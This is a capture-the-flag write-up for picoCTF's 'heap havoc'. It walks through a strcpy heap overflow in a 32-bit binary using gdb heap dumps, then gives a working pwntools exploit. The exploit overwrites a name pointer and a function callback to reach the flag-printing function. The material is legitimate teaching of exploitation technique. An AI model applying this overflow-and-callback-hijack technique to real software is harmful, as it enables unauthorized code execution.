## heap havoc
"A seemingly harmless program takes two names as arguments, but there’s a catch. By overflowing the input buffer, you can overwrite the saved return address and redirect execution to a hidden part of the binary that prints the flag."

Starting with checking the binary with `file` and enabled security features

running `file vuln`:
```
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2
```
so we're dealing with a 32 bit binary, meaning any pointer is only 4 bytes long.

```
[+] checksec for 'vuln'
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```
No significant security features are noticed here, meaning any addresses we find in the binary while statically analyzing it will remain the same.

---
## Approach

Let's see what immediate vulnerabilities are apparent in the source code.
```
strcpy(i1->name, argv[1]);  
strcpy(i2->name, argv[2]); 

if (i1->callback) i1->callback();
if (i2->callback) i2->callback();
```
an insecure call to `strcpy` twice and a function call, so if we could overwrite `i1->callback()` to be `winner()` that should do it, let's give that a try.

Over here in the source code we can see `i1-name` and `i2-name` are our input buffers, they belong to a bigger struct called `internet`.

```
struct internet {
    int priority; // 4 bytes
    char *name; // 4 bytes since we're in 32-bit world
    void (*callback)(); // 4 bytes also
};
```
taking a look we can see the struct is 12 bytes long, and `i1->name` is 8 bytes long.

running `vmmap` to find out where our heap lies shows this:
```
Start      End        Offset     Perm Path
0x0804d000 0x0806f000 0x00000000 rw- [heap]
```

so lets analyze the entire heap with `telescope` right before `strcpy` is called
```
gef➤  telescope 0x0804d400 -l 28
0x0804d400│+0x0000: 0x00000000
0x0804d404│+0x0004: 0x00000000
0x0804d408│+0x0008: 0x00000000
0x0804d40c│+0x000c: 0x00000000
0x0804d410│+0x0010: 0x00000000
0x0804d414│+0x0014: 0x00000000
0x0804d418│+0x0018: 0x00000000
0x0804d41c│+0x001c: 0x00000011  ---> beginning of first malloc block for i1
0x0804d420│+0x0020: 0x00000001  -> i1=>priority
0x0804d424│+0x0024: 0x0804d430  →  0x00000000  -> i1->name pointer
0x0804d428│+0x0028: 0x00000000  -> i1->callback
0x0804d42c│+0x002c: 0x00000011
0x0804d430│+0x0030: 0x00000000	 ← $eax  --> the 8 bytes allocated for i1->name
0x0804d434│+0x0034: 0x00000000
0x0804d438│+0x0038: 0x00000000
0x0804d43c│+0x003c: 0x00000011  ---> beginning of i2
0x0804d440│+0x0040: 0x00000002  -> i2->priority
0x0804d444│+0x0044: 0x0804d450  →  0x00000000  -> i2->name pointer
0x0804d448│+0x0048: 0x00000000  -> i2->callback (WE CAN OVERWRITE THIS)
0x0804d44c│+0x004c: 0x00000011
0x0804d450│+0x0050: 0x00000000  --> 8 bytes allocated for i2->name
0x0804d454│+0x0054: 0x00000000
0x0804d458│+0x0058: 0x00000000	 ← $ecx
0x0804d45c│+0x005c: 0x00021ba9
0x0804d460│+0x0060: 0x00000000
0x0804d464│+0x0064: 0x00000000
0x0804d468│+0x0068: 0x00000000
0x0804d46c│+0x006c: 0x00000000
```
we can see here `i2->callback` is 20 bytes away from our first input buffer.
lets try changing this value to the address of `winner()`
```
gef➤  info functions winner
All functions matching regular expression "winner":

Non-debugging symbols:
0x080492b6  winner
```

writing the payload in hex:
```
gef➤  run `echo "123412341234123412341234\xb6\x92\x04\x08"` `echo "1"`
```

now we can see right after the first `strcpy` that we wrote
```
0x0804d420│+0x0020: 0x00000001
0x0804d424│+0x0024: 0x0804d430  →  0x34333231
0x0804d428│+0x0028: 0x00000000
0x0804d42c│+0x002c: 0x00000011
0x0804d430│+0x0030: 0x34333231
0x0804d434│+0x0034: 0x34333231
0x0804d438│+0x0038: 0x34333231
0x0804d43c│+0x003c: 0x34333231
0x0804d440│+0x0040: 0x34333231
0x0804d444│+0x0044: 0x34333231
0x0804d448│+0x0048: 0x080492b6  →  <winner+0000> endbr32 --> i2->callback
0x0804d44c│+0x004c: 0x00000000
```

lets keep running the program to see if its going to go straight to the winner function.

```
[#0] Id 1, Name: "vuln", stopped 0xf7e08c33 in ?? (), reason: SIGSEGV
------- trace -----------
[#0] 0xf7e08c33 → mov WORD PTR [edx], ax
[#1] 0x8049494 → main()
```
we see we've segfaulted in the second `strcpy` since we've also overwrote the pointer to i2->name with "1234", lets rewrite this to protect the pointer this time.

```
gef➤  run `echo "12341234123412341234\x50\xd4\x04\x08\xb6\x92\x04\x08"` `echo "1"`
```

```
0x0804d41c│+0x001c: 0x00000011
0x0804d420│+0x0020: 0x00000001
0x0804d424│+0x0024: 0x0804d430  →  0x34333231
0x0804d428│+0x0028: 0x00000000
0x0804d42c│+0x002c: 0x00000011
0x0804d430│+0x0030: 0x34333231
0x0804d434│+0x0034: 0x34333231
0x0804d438│+0x0038: 0x34333231
0x0804d43c│+0x003c: 0x34333231
0x0804d440│+0x0040: 0x34333231
0x0804d444│+0x0044: 0x0804d450  →  0x00000031 ("1"?)
0x0804d448│+0x0048: 0x080492b6  →  <winner+0000> endbr32
0x0804d44c│+0x004c: 0x00000000
0x0804d450│+0x0050: 0x00000031 ("1"?)	 ← $eax, $edx
0x0804d454│+0x0054: 0x00000000
0x0804d458│+0x0058: 0x00000000
```
there we go! we go through the second `strcpy` no problem.
lets see if our modified `i2->callback` will be called.
```
gef➤  fin
Run till exit from #0  0x080492e5 in winner ()
Error opening flag.txt: No such file or directory
[Inferior 1 (process 712529) exited with code 01]
```
so we managed to run this locally correctly, lets try to write an exploit now for this challenge
```
from pwn import *

target_ip = args.HOST
target_port = int(args.PORT)

# Connect to the remote server
io = remote(target_ip, target_port)

i2name = p32(0x0804d450)
winner = p32(0x080492b6)

io.recvuntil(b"space:\n")
io.sendline(b"A"*20 + i2name + winner + b" 1") 
io.interactive()


```
so lets run this now.

```
% python vuln.py HOST=foggy-cliff.picoctf.net PORT=54286
```
```
[+] Opening connection to foggy-cliff.picoctf.net on port 54286: Done
[*] Switching to interactive mode
Enter two names separated by space:
[*] Got EOF while reading in interactive
$
$
[*] Closed connection to foggy-cliff.picoctf.net port 54286
[*] Got EOF while sending in interactive
```

huh that didnt work... getting `EOF` also might signify the fact we're getting a segfault, could that be the same kind we got before from the second `strcpy`?

researching this issue presents us with another security feature called ASLR (Address Space Layout Randomization), which means the heap address we used previously for `i2->name` could very well be completely different on another machine, so to mitigate this we can just write to any other writable area in the memory, for this we can try the `.data` or `.bss` memory regions, since those are hard-coded in the binary and PIE isnt enabled, we could very well use those

let's find where those are with `vmmap` again (although we can find those without `gdb`)
```
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-- 
0x08049000 0x0804a000 0x00001000 r-x ---> our code
0x0804a000 0x0804b000 0x00002000 r-- 
0x0804b000 0x0804c000 0x00002000 r-- 
0x0804c000 0x0804d000 0x00003000 rw- ---> read-write .data segment
0x0804d000 0x0806f000 0x00000000 rw- [heap]
```
lets check this memory address with `telescope`
```
gef➤  telescope 0x0804c000 -l 20
```
```
0x0804c000│+0x0000: 0x0804bf10  →  0x00000001	 ← $ebx
0x0804c004│+0x0004: 0xf7ffda60  →  0x00000000
0x0804c008│+0x0008: 0xf7fd8fb0  →   push eax
0x0804c00c│+0x000c: 0x08049040  →   endbr32
0x0804c010│+0x0010: 0xf7dd23a0  →  <fflush+0000> endbr32
0x0804c014│+0x0014: 0x08049060  →   endbr32
0x0804c018│+0x0018: 0x08049070  →   endbr32
0x0804c01c│+0x001c: 0x08049080  →   endbr32
0x0804c020│+0x0020: 0x08049090  →   endbr32
0x0804c024│+0x0024: 0xf7dfc1c0  →  <malloc+0000> endbr32
0x0804c028│+0x0028: 0xf7dd4a60  →  <puts+0000> endbr32
0x0804c02c│+0x002c: 0x080490c0  →   endbr32
0x0804c030│+0x0030: 0xf7d786c0  →  <__libc_start_main+0000> endbr32
0x0804c034│+0x0034: 0x080490e0  →   endbr32
0x0804c038│+0x0038: 0x00000000  ---> free real estate
0x0804c03c│+0x003c: 0x00000000
0x0804c040│+0x0040: 0x00000000
0x0804c044│+0x0044: 0x00000000
0x0804c048│+0x0048: 0x00000000
0x0804c04c│+0x004c: 0x00000000
```
so we can see starting right from `0x0804c038` we can use this free space!

lets modify our exploit once again.
```
from pwn import *

target_ip = args.HOST
target_port = int(args.PORT)

# Connect to the remote server
io = remote(target_ip, target_port)

--- i2name = p32(0x0804d450)
+++ i2name = p32(0x0804c038)
winner = p32(0x080492b6)

io.recvuntil(b"space:\n")
io.sendline(b"A"*20 + i2name + winner + b" 1") 
io.interactive()

```

```
[+] Opening connection to foggy-cliff.picoctf.net on port 63219: Done
[*] Switching to interactive mode
Enter two names separated by space:
FLAG: picoCTF{REDACTED}
No winners this time, try again!
```

and so our exploit finally worked!

---
## Solution
```
from pwn import *

target_ip = args.HOST
target_port = int(args.PORT)

# Connect to the remote server
io = remote(target_ip, target_port)

--- i2name = p32(0x0804d450)
+++ i2name = p32(0x0804c038)
winner = p32(0x080492b6)

io.recvuntil(b"space:\n")
io.sendline(b"A"*20 + i2name + winner + b" 1") 
io.interactive()
```
